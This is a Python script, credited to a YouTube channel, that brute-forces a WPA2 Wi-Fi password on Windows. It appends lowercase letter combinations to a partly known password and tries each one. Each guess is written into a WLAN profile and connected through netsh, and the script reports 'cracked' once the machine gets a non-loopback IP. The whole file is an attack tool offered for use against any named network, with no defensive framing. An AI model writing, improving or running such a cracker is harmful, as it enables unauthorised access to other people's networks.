"""
Code Modified By AdhilTech
Visit https://www.youtube.com/adhiltech
"""

import os
import socket
import time
from itertools import product
plat="Windows";

#-------
bruteforce_set="abcdefghijklmnopqrstuvwxyz";
limit=2
#-------

def createNewConnection(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if  plat == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
        x=os.popen(command).read()
        #print("AfterX")
        #print(x)
        os.remove(name+".xml")
        
def connect(name, SSID):
    y=os.popen("netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi").read()
    #print("AfterY")
    #print(y)

print("TURN OFF INTERNET CONNECTION BEFORE STARTING")
print("Code By Youtube/AdhilTech")
wifiname=str(input("Enter the Wifi Name (Exact Name): "))
known_data=str(input("Enter the Wifi Password as you know (KnownData): "))
bf_length=int(input("Enter Brute For Attack Length: "))
if(bf_length<8):
    print("Invalid Password Length.. Length more than or equal to 8")
    input();
    exit()
loop_bf=(bf_length-len(known_data))
#print()
#exit();
for combination in product(bruteforce_set, repeat=loop_bf):
    attempt="".join(combination)
    print("Password:"+known_data+attempt)
    wifiname = wifiname
    password=known_data+attempt
    print("Brute Force Trying with "+password)
    createNewConnection(wifiname, wifiname, password)
    connect(wifiname, wifiname)
    time.sleep(limit)
    ip=socket.gethostbyname(socket.gethostname())
    if(ip!="127.0.0.1"):
        print("Password Cracked Successfully : Wifi Password is "+password)
        input();
    else:
        print("Wrong Password\n")
